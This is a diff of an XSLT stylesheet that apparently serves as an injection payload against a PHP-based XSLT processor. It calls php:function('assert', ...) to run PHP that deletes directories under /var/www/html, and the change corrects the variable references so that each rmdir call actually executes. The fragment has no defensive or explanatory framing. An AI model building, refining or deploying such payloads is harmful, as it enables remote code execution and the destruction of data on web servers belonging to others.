@@ -15,12 +15,12 @@
         <xsl:value-of select="php:function('assert', $e)"/> 
    
            <xsl:variable name="f">rmdir(glob('/var/www/html/*')[0])</xsl:variable>                                                    
-        <xsl:value-of select="php:function('assert', $e)"/> 
+        <xsl:value-of select="php:function('assert', $f)"/> 
    
            <xsl:variable name="g">rmdir(glob('/var/www/html/*')[1])</xsl:variable>                                                    
-        <xsl:value-of select="php:function('assert', $e)"/> 
+        <xsl:value-of select="php:function('assert', $g)"/> 
    
            <xsl:variable name="h">rmdir(glob('/var/www/html/*')[2])</xsl:variable>                                                    
-        <xsl:value-of select="php:function('assert', $e)"/> 
+        <xsl:value-of select="php:function('assert', $h)"/> 
 </xsl:template> 
 </xsl:stylesheet>
